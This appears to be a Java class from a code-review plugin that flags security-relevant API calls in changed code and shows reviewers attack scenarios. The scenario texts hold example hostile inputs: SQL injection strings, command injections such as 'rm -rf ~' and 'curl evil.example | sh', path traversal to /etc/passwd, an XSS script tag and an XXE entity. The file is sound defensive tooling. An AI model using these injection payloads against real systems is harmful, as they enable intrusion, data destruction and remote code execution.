package de.setsoftware.reviewtool.intellij;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Pattern;

/**
 * Finds uses of security-relevant APIs in the changed lines of a stop and describes an attack scenario for
 * each. In an experiment, an explicit attack scenario made reviewers find missing input validation much more
 * often than a general reminder of security (Braz et al., ICSE 2021). The hints are unchecked: they only say
 * that the changed code uses such an API, not that it is vulnerable.
 */
final class SecurityHints {

    /**
     * A hint for a stop: what has been found and the attack scenario to think through.
     */
    static final class Hint {
        private final String topic;
        private final String scenario;

        Hint(String topic, String scenario) {
            this.topic = topic;
            this.scenario = scenario;
        }

        /** The topic, e.g. "SQL". */
        String getTopic() {
            return this.topic;
        }

        /** The attack scenario and the question to check. */
        String getScenario() {
            return this.scenario;
        }

        @Override
        public String toString() {
            return this.topic + ": " + this.scenario;
        }
    }

    /**
     * A rule: a hint that is given if the changed lines match the pattern (and not the exclusion, if any).
     */
    private static final class Rule {
        private final Pattern pattern;
        private final Pattern unlessPattern;
        private final Hint hint;

        Rule(String pattern, String unlessPattern, String topic, String scenario) {
            this.pattern = Pattern.compile(pattern);
            this.unlessPattern = unlessPattern == null ? null : Pattern.compile(unlessPattern);
            this.hint = new Hint(topic, scenario);
        }
    }

    private static final List<Rule> RULES = new ArrayList<>();

    static {
        RULES.add(new Rule(
                "(?i)(execute\\w*|prepareStatement|prepareCall|create(Native)?Query|addBatch)"
                + "\\s*\\([^;]*(\"\\s*\\+|\\+\\s*\")"
                + "|(?i)\"\\s*(select|insert|update|delete)\\b[^\"]*\"\\s*\\+",
                null, "SQL",
                "an attacker passes x' OR '1'='1 (or '; DROP TABLE ...) in a value that is concatenated into the"
                + " SQL statement. Is every value passed as a bind parameter instead?"));
        RULES.add(new Rule(
                "Runtime\\.getRuntime\\(\\)\\.exec\\s*\\(|new\\s+ProcessBuilder\\s*\\(",
                null, "Command execution",
                "a value contains \"; rm -rf ~\" or \"&& curl evil.example | sh\". Is the command made of fixed"
                + " parts, with each argument as a separate element, and are the arguments validated?"));
        RULES.add(new Rule(
                "getParameter(Values|Map)?\\s*\\(|@(RequestParam|PathVariable|RequestBody|RequestHeader|QueryParam"
                + "|PathParam|FormParam|HeaderParam)\\b|getHeader\\s*\\(|getQueryString\\s*\\(",
                null, "Input validation",
                "this value comes from outside. What happens with an empty or very long value, \"../../etc/passwd\","
                + " \"<script>alert(1)</script>\", a negative number or an unexpected format? Is it validated before"
                + " it is used?"));
        RULES.add(new Rule(
                "(new\\s+(File|FileInputStream|FileOutputStream|FileReader|FileWriter)|Paths\\.get|Path\\.of)"
                + "\\s*\\([^;]*\\+",
                null, "File path",
                "a file name like \"../../etc/passwd\" or an absolute path. Is the resulting path checked to stay"
                + " inside the intended directory (after normalizing it)?"));
        RULES.add(new Rule(
                "new\\s+ObjectInputStream\\s*\\(|\\.readObject\\s*\\(|new\\s+XMLDecoder\\s*\\(",
                null, "Deserialization",
                "crafted serialized data runs code while it is read (gadget chains). Does the data only come from"
                + " trusted sources, or is a filter (ObjectInputFilter) set?"));
        RULES.add(new Rule(
                "(DocumentBuilderFactory|SAXParserFactory|XMLInputFactory|TransformerFactory|SchemaFactory)"
                + "\\.new(Instance|Factory)\\s*\\(",
                "setFeature|setProperty|XMLConstants\\.FEATURE_SECURE_PROCESSING|ACCESS_EXTERNAL",
                "XML parser",
                "an XML document with <!DOCTYPE x [<!ENTITY e SYSTEM \"file:///etc/passwd\">]> (XXE). Are DTDs and"
                + " external entities disabled for this parser?"));
        RULES.add(new Rule(
                "MessageDigest\\.getInstance\\s*\\(\\s*\"(MD5|SHA-?1)\"|Cipher\\.getInstance\\s*\\(\\s*\"(DES|RC4|"
                + "AES/ECB)|new\\s+Random\\s*\\([^)]*\\)[^;]*(?i)(token|password|secret|key|salt|nonce)",
                null, "Cryptography",
                "is this used for passwords, tokens or keys? MD5, SHA-1, DES, RC4, ECB mode and java.util.Random"
                + " can be broken or predicted there (SecureRandom, a password hash like bcrypt, AES-GCM)."));
        RULES.add(new Rule(
                "(?i)(password|passwd|secret|api_?key|access_?token)\\w*\\s*[=:]\\s*\"[^\"]{4,}\"",
                null, "Secret in the code",
                "everybody with access to the repository can read this value, and it stays in the history even if"
                + " it is removed later. Does it belong into a configuration or a secret store?"));
    }

    private SecurityHints() {
    }

    /**
     * Returns the hints for the given changed lines (empty if there are none).
     */
    static List<Hint> find(String changedLines) {
        final List<Hint> ret = new ArrayList<>();
        for (final Rule rule : RULES) {
            if (rule.pattern.matcher(changedLines).find()
                    && (rule.unlessPattern == null || !rule.unlessPattern.matcher(changedLines).find())) {
                ret.add(rule.hint);
            }
        }
        return ret;
    }

}
